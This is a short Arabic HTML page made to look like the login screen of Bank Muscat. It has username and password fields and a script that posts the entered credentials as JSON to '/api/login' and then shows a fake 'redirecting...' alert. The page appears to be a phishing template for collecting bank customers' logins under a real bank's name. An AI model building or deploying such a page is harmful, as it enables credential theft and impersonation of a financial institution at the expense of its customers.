<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك مسقط - تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial; }
        body { background: white; color: black; padding: 20px; max-width: 400px; margin: 0 auto; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; margin: 20px 0; }
        .form-group { margin: 15px 0; }
        .input-field { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; margin: 5px 0; }
        .login-btn { width: 100%; padding: 15px; background: #dc3545; color: white; border: none; border-radius: 8px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="logo">بنك مسقط</div>
    
    <form id="loginForm">
        <div class="form-group">
            <label>اسم المستخدم</label>
            <input type="text" class="input-field" placeholder="اسم المستخدم" required id="username">
        </div>
        
        <div class="form-group">
            <label>الرقم السري</label>
            <input type="password" class="input-field" placeholder="الرقم السري" required id="password">
        </div>
        
        <button type="submit" class="login-btn">تسجيل الدخول</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // إرسال البيانات
            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            
            alert('جاري التحويل...');
        });
    </script>
</body>
</html>
